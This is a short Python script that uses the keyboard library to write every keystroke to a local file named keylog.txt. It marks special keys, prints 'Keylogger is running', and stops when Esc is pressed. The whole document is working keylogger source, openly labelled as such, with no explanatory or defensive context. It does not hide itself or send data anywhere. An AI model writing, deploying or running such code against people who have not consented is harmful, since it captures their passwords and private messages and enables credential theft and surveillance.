import keyboard

# Define log file
log_file = "keylog.txt"

def log_key(event):
    """Logs the pressed key to a file."""
    try:
        with open(log_file, "a") as f:
            if event.name == "space":
                f.write(" [SPACE] ")
            elif event.name == "enter":
                f.write(" [ENTER]\n")
            elif event.name == "backspace":
                f.write(" [BACKSPACE] ")
            else:
                f.write(event.name)
    except Exception as e:
        print(f"Error: {e}")

# Start listening for key events
keyboard.on_press(log_key)

print("Keylogger is running... Press 'Esc' to stop.")
keyboard.wait("esc")  # Stops when 'Esc' is pressed
